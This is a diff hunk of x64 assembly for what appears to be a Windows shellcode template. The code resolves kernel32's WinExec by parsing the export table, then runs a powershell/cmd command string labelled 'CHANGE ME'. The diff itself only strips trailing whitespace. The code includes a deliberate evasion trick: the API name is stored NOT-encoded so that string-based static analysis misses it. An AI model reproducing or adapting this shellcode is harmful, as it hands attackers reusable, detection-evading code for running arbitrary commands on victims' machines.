@@ -16,7 +16,7 @@ default rel
 
 segment .text
 global main
-cmd db "powershell.exe -c cmd.exe /c echo 'TEST'",0      ; <--- !! CHANGE ME !! 
+cmd db "powershell.exe -c cmd.exe /c echo 'TEST'",0      ; <--- !! CHANGE ME !!
 
 main:
 xor rdi, rdi            ; RDI = 0x0
@@ -60,7 +60,7 @@ getapiaddr:
 pop rbx                   ; save the return address for ret 2 caller after API address is found
 pop rcx                   ; Get the string length counter from stack
 xor rax, rax              ; Setup Counter for resolving the API Address after finding the name string
-mov rdx, rsp              ; RDX = Address of API Name String to match on the Stack 
+mov rdx, rsp              ; RDX = Address of API Name String to match on the Stack
 push rcx                  ; push the string length counter to stack
 loop:
 mov rcx, [rsp]            ; reset the string length counter from the stack
@@ -69,7 +69,7 @@ mov edi, [r11+rax*4]      ; EDI = RVA NameString = [&NamePointerTable + (Counter
 add rdi, r8               ; RDI = &NameString    = RVA NameString + &kernel32.dll
 mov rsi, rdx              ; RSI = Address of API Name String to match on the Stack  (reset to start of string)
 repe cmpsb                ; Compare strings at RDI & RSI
-je resolveaddr            ; If match then we found the API string. Now we need to find the Address of the API 
+je resolveaddr            ; If match then we found the API string. Now we need to find the Address of the API
 incloop:
 inc rax
 jmp short loop
@@ -87,7 +87,7 @@ apis:                       ; API Names to resolve addresses
 			    ; WinExec | String length : 7
 xor rcx, rcx
 add cl, 0x7                 ; String length for compare string
-mov rax, 0x9C9A87BA9196A80F ; not 0x9C9A87BA9196A80F = 0xF0,WinExec 
+mov rax, 0x9C9A87BA9196A80F ; not 0x9C9A87BA9196A80F = 0xF0,WinExec
 not rax 		    ;mov rax, 0x636578456e6957F0 ; cexEniW,0xF0 : 636578456e6957F0 - Did Not to avoid WinExec returning from strings static analysis
 shr rax, 0x8                ; xEcoll,0xFFFF --> 0x0000,xEcoll
 push rax
@@ -101,7 +101,7 @@ mov r14, rax                ; R14 = Kernel32.WinExec Address
 ; );
 xor rcx, rcx
 mul rcx                     ; RAX & RDX & RCX = 0x0
-				
+
 push rax                    ; Null terminate string on stack
 lea rax, qword [rel cmd]    ; Load pointer to cmd
 push rax    	            ; push pointer to cmd
